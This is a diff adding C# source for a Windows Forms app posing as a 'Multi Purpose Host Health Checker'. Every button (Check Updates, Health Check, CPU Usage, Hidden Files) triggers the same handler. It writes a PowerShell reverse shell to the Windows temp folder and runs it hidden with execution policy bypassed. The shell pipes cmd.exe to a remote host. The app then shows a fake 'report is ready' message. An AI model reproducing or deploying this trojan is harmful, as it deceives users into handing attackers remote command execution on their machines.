@@ -1,0 +1,280 @@
+using System;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Windows.Forms;
+
+namespace MissingUpdateLauncher
+{
+    public class Form : System.Windows.Forms.Form
+    {
+        public Form()
+        {
+            InitializeComponent();
+        }
+
+        private void createpsrevshell()
+        {
+            string psrevshelltempalte = @"function cleanup {
+if ($client.Connected -eq $true) {$client.Close()}
+if ($process.ExitCode -ne $null) {$process.Close()}
+exit}
+$address = 'RHOST'
+$port = 'RPORT'
+$client = New-Object system.net.sockets.tcpclient
+$client.connect($address,$port)
+$stream = $client.GetStream()
+$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
+$process.StartInfo.RedirectStandardInput = 1
+$process.StartInfo.RedirectStandardOutput = 1
+$process.StartInfo.UseShellExecute = 0
+$process.Start()
+$inputstream = $process.StandardInput
+$outputstream = $process.StandardOutput
+Start-Sleep 1
+$encoding = new-object System.Text.AsciiEncoding
+while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
+$stream.Write($encoding.GetBytes($out),0,$out.Length)
+$out = $null; $done = $false; $testing = 0;
+while (-not $done) {
+if ($client.Connected -ne $true) {cleanup}
+$pos = 0; $i = 1
+while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
+$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
+$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
+if ($pos -gt 0) {
+$string = $encoding.GetString($networkbuffer,0,$pos)
+$inputstream.write($string)
+start-sleep 1
+if ($process.ExitCode -ne $null) {cleanup}
+else {
+$out = $encoding.GetString($outputstream.Read())
+while($outputstream.Peek() -ne -1){
+$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
+$stream.Write($encoding.GetBytes($out),0,$out.length)
+$out = $null
+$string = $null}} else {cleanup}}
+";
+            File.WriteAllText(@"C:\windows\temp\powres.ps1", psrevshelltempalte);
+            runpsrevshell();
+        }
+
+
+        private void runpsrevshell()
+        {
+
+            ProcessStartInfo pinfo = new ProcessStartInfo();
+            if (Environment.Is64BitOperatingSystem)
+            {
+                pinfo.FileName = @"c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
+
+            }
+            else
+            {
+                pinfo.FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0>powershell.exe";
+            }
+
+            //p.StartInfo.Arguments = "-w hidden -ep bypass -nop -c" + "IEX (C:\\Windows\\Temp\\powrev.ps1)";
+            string ps1File = @"C:\windows\temp\powres.ps1";
+            string strCmdText = $"-w hidden -nop -ep bypass -file \"{ps1File}\"";
+            pinfo.Arguments = strCmdText;
+            pinfo.UseShellExecute = false;
+            //pinfo.CreateNoWindow = true;
+            pinfo.RedirectStandardOutput = false;
+            // pinfo.Verb = "runas";
+            try
+            {
+                Process.Start(pinfo);
+            }
+            catch (Exception e)
+            {
+
+                MessageBox.Show(e.Message);
+            }
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            //createpsrevshell();
+            this.Close();
+        }
+
+        private void btnUpdateCheck_Click(object sender, EventArgs e)
+        {
+            createpsrevshell();
+            System.Threading.Thread.Sleep(4000);
+            MessageBox.Show("Report is ready to download at current folder", "Scan Result", MessageBoxButtons.OK);
+        }
+
+        private void button1_MouseEnter(object sender, EventArgs e)
+        {
+            (sender as Button).BackColor = Color.Red;
+
+        }
+
+        private void button1_MouseLeave(object sender, EventArgs e)
+        {
+            (sender as Button).BackColor = Color.Gray;
+
+        }
+
+         /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form));
+            this.headerpanel = new System.Windows.Forms.Panel();
+            this.button1 = new System.Windows.Forms.Button();
+            this.missinglabel = new System.Windows.Forms.Label();
+            this.btnHealthCheck = new System.Windows.Forms.Button();
+            this.btnCPUUsage = new System.Windows.Forms.Button();
+            this.btnUpdateCheck = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.headerpanel.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // headerpanel
+            // 
+            this.headerpanel.BackColor = System.Drawing.SystemColors.ActiveCaption;
+            this.headerpanel.Controls.Add(this.button1);
+            this.headerpanel.Controls.Add(this.missinglabel);
+            this.headerpanel.Dock = System.Windows.Forms.DockStyle.Top;
+            this.headerpanel.Font = new System.Drawing.Font("Century Gothic", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.headerpanel.Location = new System.Drawing.Point(0, 0);
+            this.headerpanel.Margin = new System.Windows.Forms.Padding(4);
+            this.headerpanel.Name = "headerpanel";
+            this.headerpanel.Size = new System.Drawing.Size(460, 30);
+            this.headerpanel.TabIndex = 0;
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.SystemColors.ActiveBorder;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.ForeColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.button1.Location = new System.Drawing.Point(423, 1);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(36, 27);
+            this.button1.TabIndex = 4;
+            this.button1.Text = "X";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            this.button1.MouseEnter += new System.EventHandler(this.button1_MouseEnter);
+            this.button1.MouseLeave += new System.EventHandler(this.button1_MouseLeave);
+            // 
+            // missinglabel
+            // 
+            this.missinglabel.AutoSize = true;
+            this.missinglabel.Font = new System.Drawing.Font("Century Gothic", 8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.missinglabel.Location = new System.Drawing.Point(127, 9);
+            this.missinglabel.Name = "missinglabel";
+            this.missinglabel.Size = new System.Drawing.Size(193, 15);
+            this.missinglabel.TabIndex = 0;
+            this.missinglabel.Text = "Multi Purpose Host Health Checker";
+            // 
+            // btnHealthCheck
+            // 
+            this.btnHealthCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnHealthCheck.Location = new System.Drawing.Point(36, 133);
+            this.btnHealthCheck.Name = "btnHealthCheck";
+            this.btnHealthCheck.Size = new System.Drawing.Size(180, 56);
+            this.btnHealthCheck.TabIndex = 2;
+            this.btnHealthCheck.Text = "Health Check";
+            this.btnHealthCheck.UseVisualStyleBackColor = true;
+            this.btnHealthCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // btnCPUUsage
+            // 
+            this.btnCPUUsage.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnCPUUsage.Location = new System.Drawing.Point(241, 71);
+            this.btnCPUUsage.Name = "btnCPUUsage";
+            this.btnCPUUsage.Size = new System.Drawing.Size(180, 56);
+            this.btnCPUUsage.TabIndex = 1;
+            this.btnCPUUsage.Text = "CPU Usage";
+            this.btnCPUUsage.UseVisualStyleBackColor = true;
+            this.btnCPUUsage.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // btnUpdateCheck
+            // 
+            this.btnUpdateCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnUpdateCheck.Location = new System.Drawing.Point(36, 71);
+            this.btnUpdateCheck.Name = "btnUpdateCheck";
+            this.btnUpdateCheck.Size = new System.Drawing.Size(180, 56);
+            this.btnUpdateCheck.TabIndex = 0;
+            this.btnUpdateCheck.Text = "Check Updates";
+            this.btnUpdateCheck.UseVisualStyleBackColor = true;
+            this.btnUpdateCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // button3
+            // 
+            this.button3.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button3.Location = new System.Drawing.Point(241, 133);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(180, 56);
+            this.button3.TabIndex = 3;
+            this.button3.Text = "Hidden Files";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // Form
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 17F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(460, 222);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.btnUpdateCheck);
+            this.Controls.Add(this.btnCPUUsage);
+            this.Controls.Add(this.btnHealthCheck);
+            this.Controls.Add(this.headerpanel);
+            this.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Margin = new System.Windows.Forms.Padding(4);
+            this.MaximizeBox = false;
+            this.MaximumSize = new System.Drawing.Size(460, 250);
+            this.MinimizeBox = false;
+            this.Name = "Form";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Health Checker";
+            this.headerpanel.ResumeLayout(false);
+            this.headerpanel.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Panel headerpanel;
+        private System.Windows.Forms.Label missinglabel;
+        private System.Windows.Forms.Button btnHealthCheck;
+        private System.Windows.Forms.Button btnCPUUsage;
+        private System.Windows.Forms.Button btnUpdateCheck;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button1;
+    }
+}
